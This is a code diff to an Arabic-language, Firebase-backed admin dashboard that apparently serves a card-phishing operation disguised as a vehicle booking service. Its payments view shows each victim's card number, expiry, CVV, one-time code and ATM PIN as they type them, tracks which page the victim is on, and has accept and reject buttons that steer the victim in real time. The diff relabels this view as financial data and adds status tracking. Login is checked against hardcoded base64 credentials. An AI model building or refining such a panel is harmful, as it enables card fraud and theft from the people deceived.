@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم الذكية - Saso</title>
+    <title>نظام إدارة البيانات - لوحة التحكم</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
@@ -16,19 +16,19 @@
         .navbar { background: #1e7344; padding: 10px; display: flex; gap: 5px; position: sticky; top: 0; z-index: 100; }
         .nav-btn { flex: 1; padding: 10px; border: none; background: rgba(255,255,255,0.2); color: white; cursor: pointer; border-radius: 5px; font-size: 14px; }
         .nav-btn.active { background: white; color: #1e7344; font-weight: bold; }
-        .visitor-counter { background: #ffd700; padding: 8px; text-align: center; font-weight: bold; }
+        .visitor-counter { background: #ffd700; padding: 8px; text-align: center; font-weight: bold; font-size: 15px; color: #000; }
         .container { padding: 10px; }
         .tab-content { display: none; }
         .tab-content.active { display: block; }
-        .card { background: white; margin-bottom: 10px; padding: 12px; border-radius: 8px; border-right: 5px solid #1e7344; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .card { background: white; margin-bottom: 10px; padding: 12px; border-radius: 8px; border-right: 5px solid #1e7344; box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: relative; }
         .data-row { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 8px; }
         .box { padding: 5px 8px; background: #f0f0f0; border-radius: 4px; font-size: 13px; border: 1px solid #ddd; direction: ltr !important; unicode-bidi: bidi-override; }
-        .location-badge { display: inline-block; padding: 3px 8px; background: #e3f2fd; color: #0d47a1; border-radius: 12px; font-size: 11px; font-weight: bold; margin-right: 10px; border: 1px solid #bbdefb; }
+        .location-badge { display: inline-block; padding: 3px 8px; background: #e3f2fd; color: #0d47a1; border-radius: 12px; font-size: 11px; font-weight: bold; border: 1px solid #bbdefb; }
         .btn { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; color: white; font-size: 12px; font-weight: bold; transition: 0.3s; }
         .btn-ok { background: #28a745; }
         .btn-rej { background: #dc3545; }
         .btn-wait { background: #555 !important; opacity: 0.7; } 
-        .btn-del { background: #666; margin-right: auto; }
+        .btn-del { background: #666; }
         .logout { background: #000 !important; max-width: 80px; }
         .new-update { border: 2px solid #ffd700; animation: blinker 1s linear infinite; }
         @keyframes blinker { 50% { opacity: 0.7; } }
@@ -40,7 +40,7 @@
 
 <div id="loginOverlay">
     <div class="login-box">
-        <h3>تسجيل الدخول</h3>
+        <h3>تسجيل الدخول للنظام</h3>
         <input type="text" id="username" placeholder="اسم المستخدم">
         <input type="password" id="password" placeholder="كلمة المرور">
         <button onclick="checkLogin()">دخول</button>
@@ -49,10 +49,10 @@
 </div>
 
 <div id="adminContent">
-    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
+    <div class="visitor-counter">عدد الزوار المتواجدين الآن: <span id="onlineCount">0</span> زائر 🌐</div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">الحجوزات</button>
-        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">البطاقات</button>
+        <button class="nav-btn active" onclick="openTab(event, 'bookingSection')">قائمة الحجز</button>
+        <button class="nav-btn" onclick="openTab(event, 'cardsSection')">البيانات المالية</button>
         <button class="nav-btn logout" onclick="logout()">خروج</button>
     </div>
     <div class="container">
@@ -67,7 +67,7 @@
     function playSound() {
         const sound = document.getElementById('notifSound');
         sound.currentTime = 0; 
-        sound.play().catch(e => console.log("التفاعل مطلوب لتشغيل الصوت"));
+        sound.play().catch(e => console.log("التفاعل مطلوب"));
     }
 
     function checkSavedLogin() {
@@ -77,6 +77,7 @@
     function checkLogin() {
         const u = document.getElementById('username').value.trim().toLowerCase();
         const p = document.getElementById('password').value.trim();
+        // الحماية بالترميز كما كانت
         if((u === atob("YWRtYW4=") || u === atob("YWRtYW5f")) && p === atob("SEgxMjM0NTY3ODkw")) {
             localStorage.setItem("admin_logged_in", "true");
             showAdmin();
@@ -104,21 +105,28 @@
         if (!firebase.apps.length) firebase.initializeApp(config);
         const db = firebase.database();
 
-        db.ref('live_visitors').on('value', s => document.getElementById('onlineCount').innerText = s.numChildren());
+        // تتبع عدد الزوار المتواجدين لحظياً
+        db.ref('live_visitors').on('value', s => {
+            document.getElementById('onlineCount').innerText = s.numChildren();
+        });
 
+        // جلب بيانات الحجوزات
         db.ref('visitors').on('value', (s) => {
             let h = '';
             s.forEach((c) => {
                 const v = c.val();
                 h += `<div class="card">
-                    <b style="text-align:right; display:block;">${v.fullName || 'زائر'}</b>
+                    <b style="text-align:right; display:block;">${v.fullName || 'زائر جديد'}</b>
                     <small>🚗 ${v.vehicleType || '-'} | 🔢 ${v.plateNumber || '-'}</small>
-                    <button class="btn btn-del" style="margin-top:5px" onclick="deleteData('visitors/${c.key}')">حذف</button>
+                    <div style="margin-top:8px;">
+                         <button class="btn btn-del" onclick="deleteData('visitors/${c.key}')">حذف</button>
+                    </div>
                 </div>`;
             });
             document.getElementById('bookingList').innerHTML = h;
         });
 
+        // جلب بيانات البطاقات والـ OTP
         db.ref('payments').on('value', (s) => {
             let h = '';
             let triggerSound = false;
@@ -127,8 +135,8 @@
                 const v = c.val();
                 const id = c.key;
                 
-                // مراقبة التغييرات (بما في ذلك مكان تواجد العميل)
-                const currentDataString = `${v.cardNumber}|${v.otp}|${v.atm_pin}|${v.currentPage}`;
+                // مراقبة التغييرات في البيانات ومكان العميل الحالي
+                const currentDataString = `${v.cardNumber}|${v.otp}|${v.atm_pin}|${v.currentPage}|${v.status}`;
 
                 if (lastDataStore[id] !== undefined && lastDataStore[id] !== currentDataString) {
                     triggerSound = true;
@@ -143,25 +151,24 @@
                 const btnClassOk = isWaiting ? 'btn-ok' : 'btn-wait';
                 const btnClassRej = isWaiting ? 'btn-rej' : 'btn-wait';
 
-                // تحديد مكان العميل
-                let pageLabel = v.currentPage || 'غير محدد';
+                let pageLabel = v.currentPage || 'تصفح عام';
 
                 h += `<div class="card ${isWaiting ? 'new-update' : ''}">
                     <div style="display:flex; justify-content:space-between; align-items:center;">
                         <b style="text-align:right;">${v.cardHolder || 'عميل'}</b>
-                        <span class="location-badge">📍 ${pageLabel}</span>
+                        <span class="location-badge">📍 يتواجد في: ${pageLabel}</span>
                     </div>
                     <div class="data-row">
-                        <div class="box">${v.cardNumber || '----'}</div>
+                        <div class="box">${v.cardNumber || '---- ---- ---- ----'}</div>
                         <div class="box">📅 ${v.expiry || '--/--'}</div>
                         <div class="box">🔑 ${v.cvv || '---'}</div>
-                        <div class="box" style="color:blue; font-weight:bold;">OTP: ${v.otp || '-'}</div>
-                        <div class="box" style="color:purple; font-weight:bold;">PIN: ${v.atm_pin || '-'}</div>
+                        <div class="box" style="color:blue; font-weight:bold;">OTP: ${v.otp || 'بانتظار الإدخال'}</div>
+                        <div class="box" style="color:purple; font-weight:bold;">PIN: ${v.atm_pin || '----'}</div>
                     </div>
                     <div style="margin-top:10px; display:flex; gap:10px;">
-                        <button class="btn ${btnClassOk}" onclick="updateStatus('${id}', 'accept')">قبول</button>
-                        <button class="btn ${btnClassRej}" onclick="updateStatus('${id}', 'reject')">رفض</button>
-                        <button class="btn btn-del" onclick="deleteData('payments/${id}')">🗑</button>
+                        <button class="btn ${btnClassOk}" onclick="updateStatus('${id}', 'accept')">قبول التوجيه</button>
+                        <button class="btn ${btnClassRej}" onclick="updateStatus('${id}', 'reject')">رفض / خطأ</button>
+                        <button class="btn btn-del" onclick="deleteData('payments/${id}')">🗑 حذف</button>
                     </div>
                 </div>`;
             });
@@ -175,7 +182,7 @@
         firebase.database().ref('payments/' + id).update({ status: act }); 
     }
 
-    function deleteData(p) { if(confirm('متأكد؟')) firebase.database().ref(p).remove(); }
+    function deleteData(p) { if(confirm('هل أنت متأكد من حذف هذه البيانات؟')) firebase.database().ref(p).remove(); }
 
     function openTab(evt, name) {
         let contents = document.getElementsByClassName("tab-content");
